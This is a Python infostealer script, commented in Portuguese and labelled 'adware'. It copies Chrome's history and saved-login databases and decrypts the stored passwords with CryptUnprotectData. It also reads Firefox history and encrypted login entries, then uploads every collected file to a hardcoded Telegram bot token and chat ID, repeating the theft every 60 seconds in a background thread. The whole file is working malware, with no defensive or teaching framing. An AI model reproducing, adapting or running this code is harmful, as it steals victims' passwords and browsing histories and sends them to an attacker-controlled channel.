import os
import time
import json
import sqlite3
import shutil
import win32crypt
import threading
import psutil
import requests
from datetime import datetime

# Telegram Bot configuration
TOKEN = "7513048757:AAFtiDDLtFZwCMjoSXpDh_3CEzyyHLeiHEg"
CHAT_ID = "7483920650"

DATA_DIR = "adware_data"
os.makedirs(DATA_DIR, exist_ok=True)

# Função para enviar os logs via Telegram
def send_to_telegram(file_path, message):
    with open(file_path, 'rb') as f:
        requests.post(
            f'https://api.telegram.org/bot{TOKEN}/sendDocument',
            data={'chat_id': CHAT_ID, 'caption': message},
            files={'document': f}
        )

# Função para capturar histórico e logins do Chrome
def get_chrome_data():
    try:
        chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default'
        login_db = os.path.join(chrome_path, 'Login Data')
        history_db = os.path.join(chrome_path, 'History')

        # Copia os bancos de dados para evitar problemas de leitura com o banco em uso
        shutil.copy2(history_db, 'chrome_history.db')
        shutil.copy2(login_db, 'chrome_login.db')

        # Conecta ao banco de dados copiado de histórico
        conn = sqlite3.connect('chrome_history.db')
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls")
        urls = cursor.fetchall()

        history_file = os.path.join(DATA_DIR, 'chrome_history.txt')
        with open(history_file, 'w') as f:
            for url in urls:
                f.write(f"URL: {url[0]} - Title: {url[1]} - Last Visit: {url[2]}\n")

        send_to_telegram(history_file, "Chrome History")

        # Conecta ao banco de dados copiado de logins
        conn = sqlite3.connect('chrome_login.db')
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        logins = cursor.fetchall()

        login_file = os.path.join(DATA_DIR, 'chrome_logins.txt')
        with open(login_file, 'w') as f:
            for login in logins:
                password = win32crypt.CryptUnprotectData(login[2], None, None, None, 0)[1]
                f.write(f"URL: {login[0]} - USER: {login[1]} - PASS: {password.decode()}\n")

        send_to_telegram(login_file, "Chrome Logins")
        
    except Exception as e:
        print(f"Erro ao capturar dados do Chrome: {e}")

# Função para capturar histórico e logins do Firefox
def get_firefox_data():
    try:
        firefox_path = os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox\Profiles'
        profiles = os.listdir(firefox_path)

        for profile in profiles:
            login_db = os.path.join(firefox_path, profile, 'logins.json')
            history_db = os.path.join(firefox_path, profile, 'places.sqlite')

            # Captura histórico de navegação
            shutil.copy2(history_db, 'firefox_history.db')
            conn = sqlite3.connect('firefox_history.db')
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
            urls = cursor.fetchall()

            history_file = os.path.join(DATA_DIR, 'firefox_history.txt')
            with open(history_file, 'w') as f:
                for url in urls:
                    f.write(f"URL: {url[0]} - Title: {url[1]} - Last Visit: {url[2]}\n")

            send_to_telegram(history_file, "Firefox History")

            # Captura logins e senhas
            with open(login_db, 'r') as f:
                logins = json.load(f)['logins']

            login_file = os.path.join(DATA_DIR, 'firefox_logins.txt')
            with open(login_file, 'w') as f:
                for login in logins:
                    f.write(f"URL: {login['hostname']} - USER: {login['encryptedUsername']} - PASS: {login['encryptedPassword']}\n")

            send_to_telegram(login_file, "Firefox Logins")

    except Exception as e:
        print(f"Erro ao capturar dados do Firefox: {e}")

# Função para coletar histórico de navegação de vários navegadores
def log_browser_data():
    while True:
        get_chrome_data()
        get_firefox_data()
        time.sleep(60)  # Recoleta dados a cada 60 segundos

# Função para iniciar a coleta de dados
def start_data_collection():
    browser_thread = threading.Thread(target=log_browser_data)
    browser_thread.daemon = True
    browser_thread.start()

if __name__ == "__main__":
    print("Adware coletando dados de navegadores...")

    start_data_collection()

    while True:
        time.sleep(1)
